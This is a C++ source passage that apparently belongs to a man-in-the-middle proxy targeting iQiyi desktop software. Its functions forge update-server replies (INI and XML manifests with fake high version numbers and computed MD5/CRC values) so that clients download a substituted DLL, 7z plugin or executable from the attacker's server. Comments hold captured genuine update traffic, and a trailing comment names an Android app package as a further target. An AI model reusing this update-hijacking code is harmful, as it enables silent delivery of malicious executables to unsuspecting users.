		"file=HCDNClientNet.dll\n"
		"remotever=99.9.1.665\n"
		"localver=99.9.1.659,99.9.1.659\n"
		"region=all\n"
		"percent=0\n\n";

	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string fn = "HCDNClientNet.dll";
	string filename = Public::getUserPluginPath(lphttp->username) + fn;
	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5( filename,szmd5,hexmd5, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, szmd5, szip.c_str(), fn.c_str());

	int retlen = sprintf_s(recvBuffer, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return retlen;
}




int IqiyiPlugin::replyIqiyiPcGeePlugin(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {

	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"<?xml version='1.0' encoding='UTF-8'?>\r\n"
		"<nodes>\r\n"
		"<strategy>\r\n"
		"<ver>%s</ver>\r\n"
		"<md5>%s</md5>\r\n"							//exe md5
		"<resourceMD5>%s</resourceMD5>\r\n"			//7z md5
		"<url>http://%s/%s</url>\r\n"
		"<fileSize>%u</fileSize>\r\n"
		"<conditions>\r\n"
		"<condition percent=\"100\" />\r\n"
		"</conditions>\r\n"
		"</strategy>\r\n"
		"</nodes>";

	string version = "9.9.99.1";	//6.1.51.1

	string szip = HttpUtils::getIPstr(gServerIP) + "/" +  lphttp->username;

	string fn = "GeePlugin.7z";
	string filename = Public::getUserPluginPath(lphttp->username) + fn;
	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5( filename,szmd5,hexmd5, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, 
		version.c_str(),szmd5,szmd5, szip.c_str(), fn.c_str(),filesize);

	int retlen = sprintf_s(recvBuffer, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return retlen;
}

int IqiyiPlugin::makeIqiyiExecrc(string url,char * buf) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char execrc[256];

	*(int*)execrc = 1;

	return 0;
}



int IqiyiPlugin::replyIqiyiPcUpdateInfo(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"<?xml version='1.0' encoding='utf-8'?>\r\n"
		"<update>\r\n"
		"<qyupdate version=\"3.0.0.44\" md5=\"3980f5057747dfb5560ef14773b34db6\" />\r\n"
		"<exeupdate version=\"99.9.82.6458\" md5=\"%s\" crc32=\"%s\" filesize=\"%u\" url=\"http://%s/%s\" verinfo=\"更新内容：$$$$1.今日推荐改为瀑布式信息流。$$$$2.使用积分可以跳过片头广告啦！$$$$3.现在可以登录观看站外视频啦！\" vertext=\"V99.9.82.6548正式版\" />\r\n"
		"</update>";

	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string fn = WEIXIN_PC_UPDATE_EXE_FILENAME;
	string newexefn = fn + "_new_iqiyi";
	string filename = Public::getUserPluginPath(lphttp->username) + fn;
	string newfn = filename + "_new_iqiyi";
	ret = FileOper::fileDecryptWriter( filename, newfn);

	string crc = CryptoUtils::FileCrc32(newfn, 1024, FALSE);

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(newfn, szmd5, hexmd5, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		szmd5, crc.c_str(), filesize,szip.c_str(), newexefn.c_str());

	int retlen = sprintf_s(recvBuffer, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return retlen;
}

/*
GET /update/HCDNkernel/HCDNClientUpdate.ini HTTP/1.1
Host: p2pupdate.inter.iqiyi.com:8888
Accept: *
User-Agent: HCDNClient

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 02 Apr 2019 11:12:17 GMT
Content-Type: application/octet-stream
Content-Length: 194
Last-Modified: Wed, 20 Mar 2019 01:53:13 GMT
Connection: keep-alive
ETag: "5c919d09-c2"
Accept-Ranges: bytes

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 02 Apr 2019 11:12:17 GMT
Content-Type: application/octet-stream
Content-Length: 194
Last-Modified: Wed, 20 Mar 2019 01:53:13 GMT
Connection: keep-alive
ETag: "5c919d09-c2"
Accept-Ranges: bytes

[HCDNClientNet.dll]
md5=910d5c7be4ed77826dd824e9999f626d
url=/update/HCDNkernel/HCDNClientNet.dll
file=HCDNClientNet.dll
remotever=15.0.1.680
localver=15.0.1.663,15.0.1.663
region=all
percent=5

*/



/*
GET /ext/common/qisu2/downloader.ini HTTP/1.1
Accept-Encoding: gzip
User-Agent: Downloader
Host: static.qiyi.com
Cache-Control: no-cache

HTTP/1.1 200 OK
Server: QWS
Date: Tue, 02 Apr 2019 11:46:47 GMT
Content-Type: application/octet-stream
Content-Length: 173
Connection: keep-alive
Expires: Tue, 02 Apr 2019 11:48:07 GMT
Cache-Control: max-age=3600
X-Cache: from 10.123.8.37
Access-Control-Allow-Origin: *
X-Cache: HIT from 39.156.40.178
X-Cache: HIT from 111.62.64.107
Accept-Ranges: bytes

[Control]
app=egui,ekrn,nod32kui,nod32krn
count=1
c0=DownloadHelper
[Downloader]
DownloadHelper=http://static-s.iqiyi.com/ext/common/qisu2/DownloadHelper.dll;Start;QIYI

GET /ext/common/qisu2/DownloadHelper.dll HTTP/1.1
Accept-Encoding: gzip
User-Agent: Downloader
Host: static.qiyi.com
Cache-Control: no-cache
*/



/*
GET /product/QyUpdate/QyUpdateInfo.xml HTTP/1.1
Host: dl.static.iqiyi.com
User-Agent: Qiyi List Client PC 6.8.89.6786
Accept-Encoding: gzip
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Pragma: no-cache
Cache-Control: no-cache
Connection: close
Accept: *//*

HTTP/1.1 200 OK
Date: Mon, 27 May 2019 01:37:40 GMT
Content-Type: form-data; name="files[]"; filename="QyUpdateInfo.xml"
Content-Length: 551
Connection: close
Server: QWS
Last-Modified: Fri, 22 Mar 2019 10:27:27 GMT
Content-Disposition: attachment; filename=QyUpdateInfo.xml
X-Frame-Options: DENY
X-Cache: HIT from 36.110.220.75
X-Cache: HIT from 183.134.64.30
Accept-Ranges: bytes

﻿<?xml version='1.0' encoding='utf-8'?>
<update>
<qyupdate version="3.0.0.44" md5="3980f5057747dfb5560ef14773b34db6" />
<exeupdate version="6.7.82.6458" md5="c8ebbb58d47b3bee19afad92d3def1f6" crc32="f73d08c2" filesize="62486408" url="http://cdn.data.video.iqiyi.com/cdn/pcfile/20190128/15/44/IQIYIsetup_onlineupdate_201901031211.exe" verinfo="更新内容：$$$$1.今日推荐改为瀑布式信息流。$$$$2.使用积分可以跳过片头广告啦！$$$$3.现在可以登录观看站外视频啦！" vertext="V6.7.82.6548正式版" />
</update>
*/


//清理大师com.shyz.toutiao
//wos.anjukestatic.com/koiHgFeDckm/androidapk/a-ajk_12.21.2_12.21.3.zip
//